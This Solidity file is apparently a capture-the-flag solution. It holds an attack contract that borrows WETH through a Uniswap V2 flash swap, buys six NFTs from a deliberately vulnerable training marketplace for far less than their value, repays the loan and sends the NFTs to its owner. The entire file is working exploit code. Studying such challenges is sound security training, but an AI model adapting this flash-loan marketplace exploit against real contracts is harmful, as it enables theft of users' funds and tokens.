// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    address private DVT;
    address private WETH;
    address private owner;

    IUniswapV2Factory private factory;
    FreeRiderNFTMarketplace private marketplace;
    IERC721 private nft;

    IERC20 private weth;
    uint256[] private arrayId;

    IUniswapV2Pair private pair;

    // For this example, store the amount to repay
    uint public amountToRepay;

    constructor(
        address factoryAddress,
        address marketplaceAddress,
        address dvtAddress,
        address wethAddress,
        address nftAddress
    ) {
        factory = IUniswapV2Factory(factoryAddress);
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        DVT = dvtAddress;
        WETH = wethAddress;
        pair = IUniswapV2Pair(factory.getPair(DVT, WETH));
        owner = msg.sender;
        nft = IERC721(nftAddress);
        weth = IERC20(WETH);
        for (uint256 i = 0; i < 6; i++) {
            arrayId.push(i);
        }
    }

    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(WETH, wethAmount);

        // amount0Out is WETH, amount1Out is DVT
        pair.swap(wethAmount, 0, address(this), data);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), owner, i);
        }
    }

    // This function is called by the DVT/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, uint wethAmount) = abi.decode(
            data,
            (address, uint)
        );

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == WETH, "token borrow != WETH");

        // do malicious thing here
        // first withdraw ETH
        IWETH(WETH).withdraw(wethAmount);

        // then buy NFTs
        marketplace.buyMany{value: 15 ether}(arrayId);
        // then deposit WETH

        // about 0.3% fee, +1 to round up
        uint fee = (wethAmount * 3) / 997 + 1;
        amountToRepay = wethAmount + fee;

        IWETH(WETH).deposit{value: amountToRepay}();

        // // Transfer flash swap fee from caller
        // weth.transferFrom(caller, address(this), fee);

        // Repay
        weth.transfer(address(pair), amountToRepay);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        require(nft.ownerOf(_tokenId) == address(this));

        // nft.safeTransferFrom(address(this), owner, _tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}
